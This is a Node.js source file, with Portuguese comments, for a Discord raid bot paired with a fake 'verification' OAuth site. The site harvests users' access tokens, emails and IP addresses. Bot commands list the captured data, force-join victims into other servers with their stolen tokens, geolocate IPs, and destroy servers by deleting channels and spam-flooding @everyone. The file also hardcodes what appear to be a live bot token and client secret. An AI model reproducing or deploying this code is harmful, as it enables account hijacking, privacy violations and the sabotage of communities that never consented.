const express = require('express');
const app = express();
const { Client, GatewayIntentBits, Partials, ChannelType, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, parseEmoji } = require('discord.js');
const fs = require('fs');
const axios = require('axios');

// --- CONFIGURAÇÕES UNIFICADAS (Puxando da Render) ---
const BOT_TOKEN = process.env.BOT_TOKEN || 'MTQ1OTU1MDk2NjAzMzQyMDQ5Mg.Gflmf9.tvB-m2_GszyXlbj1N2CpCmXaLe8PdOPVzJE15I';
const CLIENT_ID = '1459550966033420492';
const CLIENT_SECRET = process.env.CLIENT_SECRET || 'p7doL9JCDnG86_jKZzHNl_zemb6nk0zO';
const LINK_BASE = 'https://rickwcl.onrender.com'; // Sua URL da Render
const REDIRECT_URI = `${LINK_BASE}/callback`;
const ID_CARGO = '1466834314225389804';
const ID_SERVIDOR = '1465936358513315976'; 
const SENHA_LOGIN = "unlocked";

// Banco de dados em JSON (substituindo o SQLite para rodar fácil no GitHub/Render)
let db = { usuarios: [], kickList: [] };
if (fs.existsSync('./storage.json')) db = JSON.parse(fs.readFileSync('./storage.json'));
const saveDb = () => fs.writeFileSync('./storage.json', JSON.stringify(db, null, 4));

// --- PARTE 1: O SITE DE CAPTURA (Antigo Python) ---
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('Erro');

    try {
        const data = new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        });

        const tokenRes = await axios.post('https://discord.com/api/v10/oauth2/token', data);
        const token = tokenRes.data.access_token;

        const userRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${token}` }
        });

        const user = userRes.data;
        const userIP = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Salva os dados (Igual o init_db do Python)
        const userData = { id: user.id, username: user.username, token: token, email: user.email || 'Privado', ip: userIP };
        const idx = db.usuarios.findIndex(u => u.id === user.id);
        if (idx > -1) db.usuarios[idx] = userData; else db.usuarios.push(userData);
        saveDb();

        // Dá o cargo no servidor (Igual o Python)
        await axios.put(`https://discord.com/api/v10/guilds/${ID_SERVIDOR}/members/${user.id}/roles/${ID_CARGO}`, {}, {
            headers: { Authorization: `Bot ${BOT_TOKEN}` }
        }).catch(() => {});

        const foto = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : "https://cdn.discordapp.com/embed/avatars/0.png";

        // Retorna o HTML IGUAL ao do seu Python
        res.send(`<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background: #0c0d12; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }.card { background: #111419; border: 1.5px solid #1f232a; border-radius: 24px; padding: 40px 20px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }.avatar-container { position: relative; display: inline-block; margin-bottom: 10px; }.avatar { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4444; padding: 4px; object-fit: cover; }.badge { position: absolute; bottom: 8px; right: 8px; background: #ff4444; border: 3px solid #111419; border-radius: 50%; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; font-size: 12px; }.status { color: #ff4444; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; display: block; }.username { font-size: 26px; font-weight: 700; margin: 10px 0; letter-spacing: -0.5px; }.info-box { background: #1a1d24; border-radius: 16px; padding: 20px; margin: 25px 0; border: 1px solid #2d3139; text-align: left; }.info-label { color: #6e7681; font-size: 11px; font-weight: 700; text-transform: uppercase; display: block; margin-bottom: 4px; }.info-value { font-size: 18px; font-weight: 800; display: block; }.check-text { color: #ff4444; font-size: 13px; margin-top: 12px; display: block; font-weight: 500; }.btn { background: #ff4444; color: white; text-decoration: none; padding: 18px; border-radius: 14px; display: block; font-weight: 800; font-size: 16px; transition: 0.3s; margin-top: 10px; }</style></head><body><div class="card"><div class="avatar-container"><img class="avatar" src="${foto}"><div class="badge">✓</div></div><span class="status">● Verificado</span><h2 class="username">${user.username}</h2><div class="info-box"><span class="info-label">SERVIDOR</span><span class="info-value">CODEN®</span><span class="check-text">✓ Cargo Atribuído</span></div><a href="https://discord.com/app" class="btn">Acessar Servidor</a></div></body></html>`);
    } catch (e) { res.send('Erro na verificação.'); }
});

// Mantém o servidor Express vivo
app.listen(process.env.PORT || 10000);

// --- PARTE 2: O BOT DE RAID (Original JS) ---
const client = new Client({
    intents: [3276799], // All intents
    partials: [Partials.Channel, Partials.Message]
});

const commands = [
    new SlashCommandBuilder().setName('ajuda').setDescription('x'),
    new SlashCommandBuilder().setName('ip').setDescription('x').addStringOption(o => o.setName('endereco').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('ping').setDescription('x'),
    new SlashCommandBuilder().setName('addemoji').setDescription('x').addStringOption(o => o.setName('emoji').setDescription('x').setRequired(true)).addStringOption(o => o.setName('nome').setDescription('x').setRequired(false)),
    new SlashCommandBuilder().setName('clear').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addIntegerOption(o => o.setName('quantidade').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('first').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('mensagem').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allmsg').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('conteudo').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('allban').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('reset').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('nuke').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('kickcall').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addUserOption(o => o.setName('alvo').setDescription('x').setRequired(true)),
    // COMANDOS NOVOS DA FUSÃO
    new SlashCommandBuilder().setName('setup').setDescription('x'),
    new SlashCommandBuilder().setName('puxar').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true)).addStringOption(o => o.setName('guild_id').setDescription('x').setRequired(true)),
    new SlashCommandBuilder().setName('listar').setDescription('x').addStringOption(o => o.setName('login').setDescription('x').setRequired(true))
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
(async () => { try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {} })();

// (Aqui entram as funções originais como getIpEmbed que você enviou...)
async function getIpEmbed(ip) {
    try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`);
        if (res.data.status === 'success') {
            return new EmbedBuilder()
                .setTitle(`🔍 Detalhes do IP: ${ip}`).setColor(0x3498db)
                .addFields({ name: 'País', value: res.data.country || 'N/A' }, { name: 'Estado', value: res.data.regionName || 'N/A' }, { name: 'Cidade', value: res.data.city || 'N/A' }, { name: 'ISP', value: res.data.isp || 'N/A' }, { name: 'Latitude/Longitude', value: `${res.data.lat}, ${res.data.lon}` })
                .setFooter({ text: 'Powered by ip-api.com' });
        }
    } catch (e) { return null; }
}

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isChatInputCommand()) return;

    if (i.commandName === 'ajuda') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('🔒 cmd - FIRST').setColor(0x00008B)
            .setDescription('🔹 /ip\n🔹 /first\n🔹 /allmsg\n🔹 /allban\n🔹 /reset\n🔹 /nuke\n🔹 /clear\n🔹 /setup\n🔹 /puxar\n🔹 /listar\n\n⚠️ *Creator by ż4*')
            .setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460702992712990780/f3013e356a3829c077c84c321798982f.gif');
        return i.reply({ embeds: [helpEmbed] });
    }

    if (i.commandName === 'setup') {
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+guilds.join+email`;
        const embed = new EmbedBuilder().setTitle("✅ Autenticação - CODEN®").setDescription("Clica no botão para te verificares!").setColor(16711680).setImage("https://cdn.discordapp.com/attachments/1468433340117028897/1468452430864977941/27ee5edaf33aac33b89e5ded3c4395b9.jpg");
        return i.reply({ embeds: [embed], components: [{ type: 1, components: [{ type: 2, style: 5, label: "Verificar", url: authUrl }] }] });
    }

    if (i.options.getString('login') !== SENHA_LOGIN) return i.reply({ content: "🔒 senha inválida", flags: [64] });

    if (i.commandName === 'listar') {
        let txt = db.usuarios.map(u => `ID: ${u.id} | Email: ${u.email} | IP: ${u.ip}`).join('\n');
        return i.reply({ content: `**Membros Capturados:**\n${txt || 'Nenhum'}`, flags: [64] });
    }

    if (i.commandName === 'puxar') {
        const gId = i.options.getString('guild_id');
        await i.reply(`🚀 Restaurando ${db.usuarios.length} membros...`);
        for (const u of db.usuarios) {
            await axios.put(`https://discord.com/api/v10/guilds/${gId}/members/${u.id}`, { access_token: u.token }, {
                headers: { Authorization: `Bot ${BOT_TOKEN}` }
            }).catch(() => {});
        }
    }

    // --- SEUS COMANDOS ORIGINAIS DE RAID (Nuke, First, etc) ---
    if (i.commandName === 'nuke') {
        const channel = i.channel;
        const novo = await channel.clone();
        await channel.delete();
        await novo.send({ content: "@everyone **NUKE BY Ż4**", embeds: [new EmbedBuilder().setImage('https://cdn.discordapp.com/attachments/1459599212852412558/1460726448754135190/70d0e28f1f1eb8aa688b32a2c942c5d1.gif')] ] });
    }

    if (i.commandName === 'first') {
        const msg = i.options.getString('mensagem');
        i.guild.channels.cache.forEach(c => c.delete().catch(() => {}));
        for (let j = 0; j < 50; j++) {
            i.guild.channels.create({ name: 'xvideos', type: ChannelType.GuildText }).then(ch => {
                setInterval(() => ch.send(`@everyone ${msg}`).catch(() => {}), 600);
            });
        }
    }
    
    // (Restante dos seus comandos originais...)
});

client.on(Events.ClientReady, () => console.log(`✅ ONLINE: 🔒 FIRST`));
client.login(BOT_TOKEN);

